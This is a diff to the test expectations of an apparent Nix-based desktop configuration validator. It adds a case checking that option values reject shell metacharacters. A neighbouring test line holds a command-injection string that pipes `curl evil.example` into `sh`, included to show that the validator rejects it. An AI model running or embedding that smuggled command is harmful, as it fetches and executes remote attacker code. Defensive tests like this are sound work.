@@ -3743,6 +3743,7 @@
             test/desktops/reserved-prefix.nix: haus.my names a private room, and a desktop is a file other people run. `haus.my.*` is reserved for rooms that live on one Mac and nowhere else, so nothing shared may name one — publish the room and it claims a plain `haus.<name>` like any other.
             test/desktops/scene-name.nix: haus.focus.scenes.deep work is not a plain scene name
             test/desktops/shell-in-free-key.nix: haus.bar.media.icons.Music"; $(curl evil.example | sh); " may not contain quotes, backslashes, `$`, backticks, newlines or tabs
+            test/desktops/shell-in-free-value.nix: haus.bar.media.icons.play takes a value with no quotes, backslashes, `$`, backticks, newlines or tabs
             test/desktops/stray-key.nix: sets `launchd` outside `haus`, and a desktop may set nothing else
             test/desktops/unknown-option.nix: haus.theme.accentColour is not a haus option
           '';
@@ -3807,6 +3808,7 @@
             reserved-prefix.nix class=desktop ok=false sets=1 rooms=- silent=13
             scene-name.nix class=desktop ok=false sets=1 rooms=focus silent=12
             shell-in-free-key.nix class=desktop ok=false sets=1 rooms=bar silent=12
+            shell-in-free-value.nix class=desktop ok=false sets=1 rooms=bar silent=12
             stray-key.nix class=desktop ok=false sets=1 rooms=haus silent=13
             unknown-option.nix class=desktop ok=false sets=1 rooms=appearance silent=12
             valid-other.nix class=desktop ok=true sets=1 rooms=haus silent=13
